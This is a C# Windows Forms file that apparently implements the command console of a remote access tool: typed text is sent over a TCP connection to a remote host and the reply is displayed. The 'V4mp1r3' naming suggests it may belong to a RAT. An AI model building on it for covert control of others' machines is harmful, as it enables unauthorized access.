using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace V4mp1r3
{
    public partial class frmCMD : Form
    {
        public frmCMD()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        TcpClient client;
        public frmCMD(TcpClient client)
        {
            InitializeComponent();
            this.client = client;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(CMD));
            thread1.Start();
        }
        private void CMD()
        {
            try
            {
                NetworkStream clientStream = client.GetStream();
                BinaryWriter bw = new BinaryWriter(clientStream);
                bw.Write(textBox1.Text);
                string receive = null;
                BinaryReader br = new BinaryReader(clientStream);
                receive = br.ReadString();
                richTextBox1.Text = receive;
            }
            catch
            {
                MessageBox.Show("远程已主机断开连接！");
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1_Click(sender, e);
            }
        }
    }
}
